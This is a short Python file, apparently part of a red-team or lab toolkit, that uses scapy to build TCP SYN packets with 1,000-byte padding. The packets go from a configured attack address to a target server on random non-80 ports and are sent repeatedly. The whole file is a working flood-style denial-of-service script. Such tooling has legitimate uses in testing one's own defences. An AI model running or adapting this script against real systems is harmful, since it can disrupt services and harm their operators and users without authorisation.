import random

from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether

from red.config import config
from red.utils import repeated


def random_port():
    port = 80
    while port == 80:
        port = random.randint(1, 65000)
    return port


def run():
    packet = (
        Ether()
        / IP(src=config.attack.ip, dst=config.server_host)
        / TCP(sport=random.randint(1025, 65000), dport=random_port(), flags='S')
        / (b"a" * 1_000)
    )
    packet.show()
    repeated(packet)
